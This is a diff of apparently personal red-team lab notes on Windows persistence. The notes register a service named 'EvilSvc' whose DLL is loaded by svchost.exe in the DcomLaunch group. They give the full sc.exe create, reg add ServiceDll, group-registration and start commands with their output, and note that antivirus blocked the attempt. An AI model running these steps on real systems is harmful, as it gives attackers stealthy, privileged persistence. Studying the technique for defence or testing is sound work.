@@ -79,7 +79,54 @@ https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-w
 failed:
 ![](./service_dll_for_svchost/servicedll.png)
  
-More thoughts - go at the root
+Theory on svchost :  https://www.geoffchappell.com/studies/windows/win32/services/svchost/index.htm?tx=21%2C22
 
-https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
+official guide on servicehost: https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
 
+1. Another attempt at creating a service dll
+
+https://github.com/apriorit/SvcHostDemo/blob/master/src/SvcHostDemo/SvcHostDemo.cpp
+
+status : Build succeeded on this.
+
+2. So lets now create a service Evilsvc
+
+`sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto`
+
+status : done
+
+```
+C:\Windows\system32>sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
+[SC] CreateService SUCCESS
+```
+
+3. modify the service dll path
+
+`reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "D:\VS Studio projects\svchost_dll\Debug\svchostdll.dll" /f`
+
+status : done
+
+```
+C:\Windows\system32>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "D:\VS Studio projects\svchost_dll\Debug\svchostdll.dll" /f
+The operation completed successfully.
+
+```
+4. Group EvilSvc with DcomLaunch
+
+As a final step, we need to tell the Service Control Manager under which service group our EvilSvcshould load. 
+We want it to get loaded in the DcomLaunch group, so we need to add our service name EvilSvc in the list of services in the DcomLaunch value in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
+
+status : added
+
+![](service_dll_for_svchost/evilsvc_in_registry.png)
+
+
+5. start evilsvc service as part of dcom launcher
+
+`sc.exe start EvilSvc`
+
+![](service_dll_for_svchost/evilsvc_adm.png)
+
+status : Didnot registre as service with antivirus enabled
+
+![](service_dll_for_svchost/evilsvc_not_found.png)
